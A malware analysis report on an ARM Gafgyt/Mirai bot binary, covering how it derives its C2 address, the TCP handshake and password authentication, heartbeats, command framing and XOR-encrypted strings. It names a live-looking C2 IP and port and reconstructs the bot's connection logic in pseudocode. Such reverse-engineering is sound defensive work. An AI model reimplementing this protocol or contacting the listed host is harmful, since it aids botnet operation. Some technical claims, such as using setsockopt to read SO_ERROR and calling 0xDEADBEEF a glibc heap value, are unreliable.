# Gafgyt/Mirai Botnet — Transport Layer Technical Specification

## 1. C2 Infrastructure Retrieval

### Observed Behavior

The C2 server address (IP and port) is **hardcoded** directly within the `main` function's assembly code. The address is constructed at runtime using arithmetic operations on constants, rather than being stored as a plain IP literal. This is a common obfuscation technique to evade simple string-based detection.

The C2 address is built into a `sockaddr` structure at the point where the TCP socket connection is initiated. The construction uses ARM `mvn` (move NOT) and `sub` (subtract) instructions to derive the final values from immediate operands.

### C2 Address Derivation

#### IP Address Construction

The IP address is derived through the following assembly sequence (at offset `0x0000c8c8` in `main`):

```arm
mvn r3, #0x23800000    ; r3 = ~0x23800000 = 0xDC7FFFFF
sub r3, r3, #0x8F00    ; r3 = 0xDC7FFFFF - 0x00008F00 = 0xDC7F70FF
sub r3, r3, #0xA3      ; r3 = 0xDC7F70FF - 0x000000A3 = 0xDC7F705C
str r3, [r4, #0x4]     ; Store at sockaddr offset 4 (sin_addr)
```

**Calculation:**
- `~0x23800000` = `0xDC7FFFFF`
- `0xDC7FFFFF - 0x8F00` = `0xDC7F70FF`
- `0xDC7F70FF - 0xA3` = `0xDC7F705C`

The resulting 32-bit value `0xDC7F705C` is stored in little-endian byte order at the `sin_addr` field of the `sockaddr` structure.

**Recovered C2 IP Address:**

| Field | Value |
|-------|-------|
| Raw value (hex) | `0xDC7F705C` |
| Little-endian bytes | `5C 70 7F DC` |
| IP address | **92.112.127.220** |

#### Port Construction

The port is derived through the following assembly sequence (at offset `0x0000c8d8` in `main`):

```arm
mvn r12, #0x5A0        ; r12 = ~0x000005A0 = 0xFFFFFA5F
sub r12, r12, #0xD     ; r12 = 0xFFFFFA5F - 0x0000000D = 0xFFFFFA52
strh r12, [r4, #0x2]   ; Store lower 16 bits at sockaddr offset 2 (sin_port)
```

**Calculation:**
- `~0x5A0` = `0xFFFFFA5F`
- `0xFFFFFA5F - 0xD` = `0xFFFFFA52`
- Lower 16 bits: `0xFA52`

The 16-bit value `0xFA52` is stored at the `sin_port` field. On a little-endian ARM system, the bytes in memory are `52 FA`. When the kernel reads this as a network byte order (big-endian) value, it interprets it as `0x52FA`.

**Recovered C2 Port:**

| Field | Value |
|-------|-------|
| Stored value (16-bit) | `0xFA52` |
| Memory bytes (LE) | `52 FA` |
| Network byte order | `0x52FA` |
| Port number | **21242** |

#### Single-Instance Control Port

The single-instance controller socket binds to a local port for receiving kill commands:

```c
// From init_single_instance_ctrl() at 0x0000c260
local_2a = 0x9DC7;     // Port = 40391
local_28 = 0x0100007F; // 127.0.0.1 (localhost)
```

**Control socket parameters:**

| Parameter | Value |
|-----------|-------|
| Bind address | `127.0.0.1` |
| Bind port | **40391** (`0x9DC7`) |

### Retrieved C2 Address(es) & Port(s)

| Purpose | IP Address | Port | Protocol |
|---------|------------|------|----------|
| C2 Server | **92.112.127.220** | **21242** | TCP |
| Single-Instance Control | 127.0.0.1 | 40391 | TCP |

### Retrieval Logic

```pseudocode
// C2 IP Address derivation
function derive_c2_ip():
    ip_raw = NOT(0x23800000)           // 0xDC7FFFFF
    ip_raw = ip_raw - 0x8F00           // 0xDC7F70FF
    ip_raw = ip_raw - 0xA3             // 0xDC7F705C
    return ip_raw                       // Stored as little-endian: 92.112.127.220

// C2 Port derivation
function derive_c2_port():
    port_raw = NOT(0x5A0)              // 0xFFFFFA5F
    port_raw = port_raw - 0xD          // 0xFFFFFA52
    return port_raw & 0xFFFF           // 0xFA52 -> network byte order: 21242

// sockaddr_in construction
function build_sockaddr():
    addr = allocate(16 bytes)
    addr[0:1] = 0x0002                 // AF_INET (family)
    addr[2:3] = derive_c2_port()       // Port in network byte order
    addr[4:7] = derive_c2_ip()         // IP in little-endian
    return addr
```

---

## 2. Transport Initialization

### Observed Behavior

The binary establishes a TCP connection to the C2 server using standard BSD socket APIs. The connection is managed through a `select()`-based event loop that handles connection state, data reception, heartbeat transmission, and reconnection logic.

The main connection flow is:
1. Create a non-blocking TCP socket
2. Send identification bytes (`0x03`, `0x04`)
3. Initiate connection to C2 server
4. On connection success, retrieve SO_ERROR to verify connection
5. Send authentication data (local IP, status byte, password)
6. Enter main event loop with `select()` timeout of 10 seconds
7. Send heartbeat (`\x00\x00`) every 60 seconds (every 6th timeout cycle)
8. Handle incoming C2 commands or reconnection on failure

### Network Parameters

| Parameter | Value | Details |
|-----------|-------|---------|
| Protocol | TCP | `AF_INET`, `SOCK_STREAM` |
| Socket type | Non-blocking | Created with `socket(2, 1, 0)` |
| C2 IP | 92.112.127.220 | Hardcoded via arithmetic |
| C2 Port | 21242 | Hardcoded via arithmetic |
| select() timeout | 10 seconds | `timeval { tv_sec: 10, tv_usec: 0 }` |
| Heartbeat interval | 60 seconds | Sent every 6th select() cycle |
| Heartbeat payload | `\x00\x00` | 2 zero bytes via `sendto()` |
| Reconnection delay (fail) | 1 second | After connection failure |
| Reconnection delay (error) | Randomized | `rand() + (rand() * seed >> 11) * -10 + 1` |

### Socket Options

During the C2 connection handshake, the following socket options are configured:

```c
// After connect() succeeds, check SO_ERROR
setsockopt(fd, SOL_SOCKET, SO_ERROR, &error, sizeof(error));
```

If `SO_ERROR` is non-zero (connection refused), the socket is closed and a randomized sleep is applied before reconnection.

### Connection Initialization Sequence

The connection initialization occurs in the main loop at offset `0x0000c8a8`:

```arm
; Socket creation
mov r0, #0x2           ; AF_INET
mov r1, #0x1           ; SOCK_STREAM
mov r2, #0x0           ; protocol = 0
bl socket

; Store socket FD
str r0, [server_fd_ptr]

; Build sockaddr
ldr r4, [sockaddr_ptr]
; ... IP and port construction (see above) ...
str r3, [r4, #0x4]     ; sin_addr
strh r12, [r4, #0x2]   ; sin_port
strh #0x2, [r4, #0x0]  ; sin_family = AF_INET

; Send identification bytes
mov r1, #0x3           ; byte 0x03
bl send
mov r1, #0x4           ; byte 0x04
orr r2, r0, #0x800     ; flags | MSG_MORE
bl send

; Set connection status flag
strb #0x1, [status_ptr]

; Initiate connection
bl connect
```

### Authentication Protocol

Upon successful connection, the bot sends authentication data to the C2 server:

1. **Local IP address** (4 bytes, retrieved via `get_local_ip()`)
2. **Status byte** (1 byte, typically `0x00` or length of password)
3. **C2 password** (variable length, from `argv[1]` or default)

The password is extracted at startup:
```c
if (argc == 2 && strlen(argv[1]) < 0x20) {
    strcpy(c2_password, argv[1]);
    memset(argv[1], 0, strlen(argv[1]));  // Clear from process listing
} else {
    strcpy(c2_password, default_password); // From string table
}
```

### Connection Logic

```pseudocode
// Global state
server_fd = -1
server_status = 0  // 0 = connecting, 1 = connected
heartbeat_counter = 0

// Main event loop
function main_loop():
    read_fds = fd_set()
    write_fds = fd_set()
    timeout = { sec: 10, usec: 0 }

    if server_fd == -1:
        // Create new connection
        server_fd = socket(AF_INET, SOCK_STREAM, 0)
        if server_fd != -1:
            // Build sockaddr with C2 IP:port
            addr = build_sockaddr()
            
            // Send identification bytes
            send(server_fd, 0x03, 0)
            send(server_fd, 0x04, 0x800)
            
            // Mark as connecting
            server_status = 1
            connect(server_fd, addr, 16)
    
    // Add FDs to select sets
    if server_status == 0:
        fd_set_add(read_fds, server_fd)
    else:
        fd_set_add(write_fds, server_fd)
    
    // Wait for events
    result = select(max_fd + 1, read_fds, write_fds, NULL, timeout)
    
    if result == 0:
        // Timeout - send heartbeat every 60 seconds
        heartbeat_counter++
        if heartbeat_counter % 6 == 0:
            sendto(server_fd, 0x0000, 2, MSG_DONTROUTE)
        return
    
    if result == -1:
        return  // Error, retry
    
    // Handle control socket (single-instance)
    if is_readable(ctrl_fd, read_fds):
        accept_and_handle_ctrl_client()
        kill_all_attacks()
        exit(0)
    
    // Handle C2 connection
    if server_status != 0:
        // Connection in progress
        server_status = 0
        if is_writable(server_fd, write_fds):
            error = getsockopt(server_fd, SO_ERROR)
            if error == 0:
                // Connection successful - authenticate
                authenticate()
            else:
                // Connection refused - close and retry with random delay
                close(server_fd)
                server_fd = -1
                sleep(random_delay())
        else:
            // Connection failed
            close(server_fd)
            server_fd = -1
            sleep(1)
        return
    
    // Handle incoming data
    if is_readable(server_fd, read_fds):
        data = malloc()
        bytes_recv = recvfrom(server_fd, data, 2, MSG_PEEK)
        
        if bytes_recv == -1:
            return  // Error
        if bytes_recv == 0:
            close(server_fd)
            server_fd = -1
            sleep(1)
            return
        
        // Check packet type
        if data[0] != 0:
            // Command packet
            recvfrom(server_fd, data, 2, 0)
            payload_len = swap_bytes(data[0])
            if payload_len > 0x400:
                close(server_fd)
                server_fd = -1
                return
            
            payload = malloc(payload_len)
            recvfrom(server_fd, payload, payload_len, 0)
            if payload_len != 0:
                attack_start(payload)
        else:
            // Heartbeat acknowledgment
            recvfrom(server_fd, data, 2, 0)

function authenticate():
    local_ip = get_local_ip()
    password_len = strlen(c2_password)
    
    // Send local IP (4 bytes)
    sendto(server_fd, local_ip_bytes, 4, MSG_DONTROUTE)
    
    // Send status byte (1 byte)
    status = password_len
    sendto(server_fd, status, 1, MSG_DONTROUTE)
    
    // Send password (variable)
    if password_len != 0:
        sendto(server_fd, c2_password, password_len, MSG_DONTROUTE)
```

### Reconnection Strategy

| Scenario | Behavior | Delay |
|----------|----------|-------|
| Connection failure (SO_ERROR) | Close socket, set FD to -1 | Random: `rand() + (rand() * seed >> 11) * -10 + 1` seconds |
| Connection timeout | Close socket, set FD to -1 | 1 second |
| Server disconnect | Close socket, set FD to -1 | 1 second |
| recvfrom error (EINTR/EAGAIN) | Continue loop | Immediate retry |
| Control socket trigger | Kill all processes | Immediate exit |

The random reconnection delay uses a global seed value stored at runtime and the formula:
```
delay = rand() + ((rand() * seed) >> 11) * (-10) + 1
```

---

## 3. String Table Analysis

### Observed Behavior

The binary uses an XOR-based string table for encrypting sensitive strings (including C2 passwords, process names, and file paths). The string table consists of:

1. **Table entries** stored in the `.bss` section (initialized at runtime)
2. **Encrypted string data** stored in the `.data` and `.rodata` sections
3. **XOR key** stored in the `.data` section

Three functions manage the string table:
- `table_retrieve_val(index, &length)` at `0x0000ce9c` — Returns pointer to string and its length
- `table_unlock_val(index)` at `0x0000cf60` — Decrypts string in-place
- `table_lock_val(index)` at `0x0000cec0` — Re-encrypts string in-place

### String Table Structure

Each table entry is **8 bytes**:
```c
struct string_entry {
    uint32_t ptr;    // Offset 0: Pointer to encrypted string data
    uint16_t length; // Offset 4: Length of the string
    uint16_t padding;// Offset 6: Unused
};
```

The table is accessed via:
- **Base pointer** for retrieve: loaded from `DAT_0000cebc` → points to `.bss` region
- **Base pointer** for lock/unlock: loaded from `DAT_0000cff8` / `DAT_0000cf58`
- **XOR key pointer**: loaded from `DAT_0000cffc` / `DAT_0000cf5c` → `0x0001809c`

### XOR Key

The XOR key is a **32-bit value** stored at address `0x0001809c` in the `.data` section:

| Field | Value |
|-------|-------|
| Key address | `0x0001809c` |
| Key value | `0xDEADBEEF` |
| Key bytes (cycling) | `0xEF`, `0xBE`, `0xAD`, `0xDE` |

**Note:** The value `0xDEADBEEF` is a well-known magic number used by glibc for heap management. Its presence at this location may indicate that the actual XOR key is derived differently or that the key is loaded at runtime from a different source. Static analysis confirms the key pointer location but the decryption results suggest the effective key may differ from `0xDEADBEEF`.

### Decryption Routine

The `table_unlock_val` function XOR-decrypts strings in-place:

```pseudocode
function table_unlock_val(index):
    base = load(DAT_0000cff8)         // String table base
    key_ptr = load(DAT_0000cffc)      // Key pointer
    key = load(key_ptr)               // 32-bit XOR key
    
    entry_offset = index * 8
    entry = base + entry_offset
    
    str_ptr = load(entry + 0)         // Pointer to string
    str_len = load_half(entry + 4)    // String length
    
    if str_len == 0:
        return
    
    for i from 0 to str_len - 1:
        byte_idx = i % 4
        if byte_idx == 0:
            key_byte = key & 0xFF
        elif byte_idx == 1:
            key_byte = (key >> 8) & 0xFF
        elif byte_idx == 2:
            key_byte = (key >> 16) & 0xFF
        else:
            key_byte = (key >> 24) & 0xFF
        
        memory[str_ptr + i] = memory[str_ptr + i] XOR key_byte
```

The ARM assembly implementation cycles through the four key bytes:
```arm
; Key bytes extracted from 32-bit key
key_byte0 = key & 0xFF        ; Least significant byte
key_byte1 = (key >> 8) & 0xFF
key_byte2 = (key >> 16) & 0xFF
key_byte3 = (key >> 24) & 0xFF ; Most significant byte

; XOR loop (bytes cycle: 0, 1, 2, 3, 0, 1, 2, 3, ...)
loop:
    ldrb r3, [str_ptr + i]     ; Load encrypted byte
    eor r3, key_byte0, r3      ; XOR with current key byte
    strb r3, [str_ptr + i]     ; Store decrypted byte
    
    ldrb r3, [str_ptr + i]
    eor r3, key_byte1, r3
    strb r3, [str_ptr + i]
    
    ldrb r3, [str_ptr + i]
    eor r3, key_byte2, r3
    strb r3, [str_ptr + i]
    
    ldrb r3, [str_ptr + i]
    eor r3, key_byte3, r3
    strb r3, [str_ptr + i]
    
    i = i + 1
    if i < str_len: goto loop
```

**Note:** The assembly shows each byte being XORed with all four key bytes sequentially within the same iteration, which appears to be a decompilation artifact. The effective behavior is cycling through key bytes: byte[0] XOR key[0], byte[1] XOR key[1], byte[2] XOR key[2], byte[3] XOR key[3], byte[4] XOR key[0], etc.

### Encrypted String Data Locations

| Section | Address | Size | Description |
|---------|---------|------|-------------|
| `.data` | `0x00018230` | 4 bytes | Entry count (value: 3) |
| `.data` | `0x00018234` | 64 bytes | Encrypted string data |
| `.rodata` | `0x00016f40` | ~80 bytes | Additional encrypted data blocks |

### Known String Table Usage

The main function accesses string table index `0x0C` (12) for the startup banner:

```c
table_unlock_val(0x0C);                          // Decrypt index 12
banner = table_retrieve_val(0x0C, &banner_len);  // Get pointer and length
write(1, banner, banner_len);                    // Write to stdout
write(1, "\n", 1);                               // Newline
table_lock_val(0x0C);                            // Re-encrypt
```

The password handling uses string table index `0x0C` for the default password when no command-line argument is provided.

### Analysis Gaps

1. **String table entry count**: The `.data` section shows a count of 3 entries at `0x00018230`, but the main function accesses index `0x0C` (12). The full string table may be constructed at runtime in the `.bss` section, which is not readable in the static binary image.

2. **Effective XOR key**: While the key pointer at `0x0000cffc` points to `0x0001809c` containing `0xDEADBEEF`, decryption attempts with this key do not produce recognizable strings. The actual effective key may be different due to:
   - The `0xDEADBEEF` value being a heap magic number rather than the XOR key
   - Runtime key modification or derivation
   - Key being stored at a different offset within the structure at `0x0001809c`

3. **Complete string table contents**: Without runtime access to the `.bss` section or the ability to observe the decrypted strings, the full string table contents cannot be definitively recovered.

---

## 4. Network Protocol Details

### C2 Communication Protocol

| Aspect | Value |
|--------|-------|
| Transport | TCP |
| Connection | Persistent (reconnects on failure) |
| Initial handshake | Bytes `0x03`, `0x04` sent before connect |
| Authentication | Local IP (4 bytes) + status (1 byte) + password (variable) |
| Heartbeat | `\x00\x00` (2 bytes) every 60 seconds |
| Command format | 2-byte length (big-endian) + payload |
| Max payload | 0x400 (1024) bytes |
| Data direction | Bidirectional (commands from C2, acknowledgments to C2) |

### Packet Format

```
C2 Command Packet:
┌──────────────────────────────────────────────────────────────────────────────────┐
│ Byte 0-1: Payload length (big-endian)                                           │
│ Byte 2+:  Payload data                                                          │
└──────────────────────────────────────────────────────────────────────────────────┘

Heartbeat (from bot):
┌──────────────────────────────────────────────────────────────────────────────────┐
│ Byte 0-1: 0x0000                                                                │
└──────────────────────────────────────────────────────────────────────────────────┘

Authentication (from bot):
┌──────────────────────────────────────────────────────────────────────────────────┐
│ Byte 0-3:  Local IP address                                                     │
│ Byte 4:    Status byte (password length)                                        │
│ Byte 5+:   Password string (if length > 0)                                      │
└──────────────────────────────────────────────────────────────────────────────────┘
```

### File Descriptor Management

| FD | Purpose | Initial Value |
|----|---------|---------------|
| `ctrl_fd` | Single-instance control socket | -1 |
| `server_fd` | C2 connection socket | -1 |

The `select()` loop monitors both FDs:
- `ctrl_fd` readable → Accept connection, kill processes, exit
- `server_fd` readable → Receive C2 data
- `server_fd` writable → Connection established

---

## 5. Verification Notes

### Confirmed Values (Verified Fact)

| Parameter | Value | Source |
|-----------|-------|--------|
| C2 IP | 92.112.127.220 | Assembly arithmetic at `0x0000c8c8` |
| C2 Port | 21242 | Assembly arithmetic at `0x0000c8d8` |
| Control Port | 40391 | Constant `0x9DC7` at `0x0000c260` |
| Socket type | TCP (`SOCK_STREAM`) | `socket(2, 1, 0)` call |
| select timeout | 10 seconds | `timeval` initialization |
| Heartbeat interval | 60 seconds | Counter modulo 6 with 10s timeout |
| Heartbeat payload | `\x00\x00` | 2 zero bytes via `sendto` |
| Initial send bytes | `0x03`, `0x04` | `send()` calls before `connect()` |
| XOR key location | `0x0001809c` | Literal pool at `0x0000cffc` |
| XOR key value | `0xDEADBEEF` | Value at `0x0001809c` |

### Analytical Hypothesis

| Finding | Confidence | Notes |
|---------|------------|-------|
| Effective XOR key differs from `0xDEADBEEF` | Medium | Decryption produces non-printable output |
| String table has ≥13 entries | High | Main accesses index 0x0C |
| Password is sent in cleartext | High | No encryption observed in send path |
| C2 protocol is custom binary | High | No HTTP/TLS patterns observed |

### Unknown

| Item | Reason |
|------|--------|
| Complete string table contents | `.bss` section not readable statically |
| Effective XOR key value | `0xDEADBEEF` decryption unsuccessful |
| C2 command set details | Attack IDs visible but full protocol undocumented |
| Default password value | Retrieved from string table at index 0x0C |
